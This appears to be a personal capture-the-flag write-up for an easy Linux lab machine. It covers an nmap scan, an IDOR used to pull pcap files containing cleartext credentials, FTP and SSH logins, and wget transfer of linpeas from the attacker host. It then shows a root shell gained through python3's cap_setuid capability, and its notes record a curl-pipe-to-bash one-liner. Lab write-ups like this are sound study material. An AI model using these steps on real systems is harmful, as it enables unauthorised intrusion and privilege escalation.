Level = #Easy
OS = #Linux
IP = 10.129.23.134
Host IP = 10.10.16.150

### Initial Scan (redo -sV)
```bash
nmap -sC -sS 10.129.23.134 -Pn
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http
|_http-title: Security Dashboard
```

### Check FTP (Can get rid of this)
```bash
└─$ nc 10.129.23.134 21              
220 (vsFTPd 3.0.3)
```

### Port 80 HTTP Website
![[Pasted image 20260626130618.png]]

### Pcap Download from the Site
Exploiting an IDOR on the Packet directory/downloading all Pcap files.
![[Pasted image 20260626131714.png]]
Captured Credentials
`nathan:Buck3tH4TF0RM3!`

### FTP Login/Capture of User Flag
![[Pasted image 20260626132042.png]]
```bash
ftp> ls
229 Entering Extended Passive Mode (|||51640|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Jun 26 16:53 user.txt
226 Directory send OK.
```

### SSH Login 
```bash
┌──(kali㉿kali)-[~]
└─$ ssh nathan@10.129.23.134
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@10.129.23.134's password: 
```
Download `Linpeas` and put it on the victim host

```bash
# Host Machine
wget https://github.com/carlospolop/PEASS-ng/releases/download/20230402/linpeas.sh

#Victim Machine
wget http://10.10.16.150:80/linpeas.sh
chmod +x linpeas.sh
```

### Priv Escalation
`./linpeas.sh`
From that saw this is red/orange
`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`
`python3 --version: Python 3.8.5`

```python
python3
import os
os.setuid(0)
os.system('id')
os.system('sh')

# ls
# cd /root
# whoami
# cat root.txt
```

# Notes to learn from
* Look into linpeas-ng
* `curl KAIL IP:port/linpeas.sh | bash`
	* Instead of running it on the victim machine
# Takeaways
Tell them about the IDOR/document it and use the `-sV`